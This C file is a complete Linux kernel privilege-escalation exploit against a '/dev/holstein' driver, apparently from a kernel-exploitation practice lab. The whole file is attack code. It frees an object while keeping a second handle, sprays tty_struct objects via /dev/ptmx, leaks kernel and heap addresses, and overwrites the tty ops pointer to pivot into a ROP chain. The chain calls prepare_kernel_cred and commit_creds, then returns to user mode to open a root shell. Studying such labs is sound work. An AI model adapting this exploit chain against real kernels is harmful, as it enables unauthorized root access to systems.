#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define DEVICE "/dev/holstein"
#define SPRAY_NUM 100
#define OPS_OFFSET 0xc39c60

uint64_t g_buf = 0;
uint64_t kernel_base = 0;
uint64_t base = 0xffffffff81000000;
int spray[SPRAY_NUM];

void spawn_shell();

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t user_rip = (uint64_t)spawn_shell;
uint64_t stack_pivot =
    0xffffffff8114fbea; // push rdx; xor eax, 0x415b004f; pop rsp; pop rbp; ret;
uint64_t pop_rdi_ret = 0xffffffff8114078a;
uint64_t pop_rcx_ret = 0xffffffff810eb7e4;
uint64_t mov_rdi_rax_movsq_ret = 0xffffffff81638e9b;
uint64_t commit_creds = 0xffffffff810723c0;
uint64_t prepare_kernel_cred = 0xffffffff81072560;
uint64_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81800e10;

void spawn_shell() {
  puts("[+] returned to user land");
  uid_t uid = getuid();
  if (uid == 0) {
    printf("[+] got root (uid = %d)\n", uid);
  } else {
    printf("[!] failed to get root (uid: %d)\n", uid);
    exit(-1);
  }
  puts("[*] spawning shell");
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh", argv, envp);
  puts("[+] win!");
  exit(0);
}

void save_userland_state() {
  puts("[*] saving user land state");
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
}

int main() {
  save_userland_state();

  int fd1 = open(DEVICE, O_RDWR);
  int fd2 = open(DEVICE, O_RDWR);
  char buf[0x400];

  if (fd1 == -1 || fd2 == -1) {
    perror("open");
    return 1;
  }

  close(fd1);

  for (int i = 0; i < SPRAY_NUM / 2; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      perror("open");
  }

  read(fd2, buf, 0x400);

  uint64_t *ptr = (uint64_t *)buf;

  kernel_base = ptr[3] - OPS_OFFSET;
  g_buf = ptr[7] - 0x38;

  //   kernel_base = *(unsigned long *)&buf[0x18] - OPS_OFFSET;
  //   g_buf = *(unsigned long *)&buf[0x38] - 0x38;

  printf("[+] kernel_base: 0x%lx\n", kernel_base);
  printf("[+] 1st g_buf: 0x%lx\n", g_buf);

  uint64_t *rop_chain = (uint64_t *)buf;
  *rop_chain++ = pop_rdi_ret - base + kernel_base;
  *rop_chain++ = 0;
  *rop_chain++ = prepare_kernel_cred - base + kernel_base;
  *rop_chain++ = pop_rcx_ret - base + kernel_base;
  *rop_chain++ = 0;
  *rop_chain++ = mov_rdi_rax_movsq_ret - base + kernel_base;
  *rop_chain++ = commit_creds - base + kernel_base;
  *rop_chain++ =
      swapgs_restore_regs_and_return_to_usermode - base + kernel_base + 22;
  *rop_chain++ = 0;
  *rop_chain++ = 0;
  *rop_chain++ = user_rip;
  *rop_chain++ = user_cs;
  *rop_chain++ = user_rflags;
  *rop_chain++ = user_sp;
  *rop_chain++ = user_ss;

  *(uint64_t *)&buf[0x3f8] = stack_pivot - base + kernel_base; // stack pivot

  puts("[*] build the rop chain");

  write(fd2, buf, 0x400);

  int fd3 = open(DEVICE, O_RDWR);
  int fd4 = open(DEVICE, O_RDWR);

  if (fd3 == -1 || fd4 == -1) {
    perror("open");
    return 1;
  }

  close(fd3);

  for (int i = SPRAY_NUM / 2; i < SPRAY_NUM; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      perror("open");
  }

  read(fd4, buf, 0x400);

  *(uint64_t *)&buf[0x18] = g_buf + 0x3f8 - 12 * 8;
  // 函数表中触发的对应函数是在0xc位置上的函数，所以这里的偏移要减去12个8字节

  puts("[*] overwrite tty_struct ops pointer");

  write(fd4, buf, 0x20);

  for (int i = SPRAY_NUM / 2; i < SPRAY_NUM; i++) {
    ioctl(spray[i], 0, g_buf - 8);
    // gadget中多余的一个pop操作会让rsp加一个8字节，所以这里要提前减掉
  }

  close(fd2);
  close(fd4);

  for (int i = 0; i < SPRAY_NUM; i++)
    close(spray[i]);

  return 0;
}

// ffffffff81269780
// ioctl(fd, rcx, rdx)